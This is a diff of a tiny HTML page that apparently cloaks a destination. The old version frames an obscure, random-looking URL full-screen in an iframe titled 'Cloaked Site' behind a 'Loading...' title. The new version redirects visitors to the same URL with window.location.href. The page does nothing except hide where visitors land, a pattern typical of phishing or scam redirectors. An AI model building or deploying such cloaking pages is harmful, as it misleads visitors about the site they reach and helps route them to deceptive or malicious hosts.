@@ -1,27 +1,18 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Loading...</title>
   <meta charset="UTF-8">
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-    }
-    iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-  </style>
+  <title>Redirecting...</title>
 </head>
 <body>
-  <iframe src="https://qw6mzx8d9.msoadmrl.com/ixDTgShW2n!iku/" title="Cloaked Site"></iframe>
+
 
   <script>
-    document.cookie = "visited=true; path=/";
+    const customUrl = "https://qw6mzx8d9.msoadmrl.com/ixDTgShW2n!iku/";
+
+    window.location.href = "https://qw6mzx8d9.msoadmrl.com/ixDTgShW2n!iku/";
+
   </script>
+
 </body>
 </html>
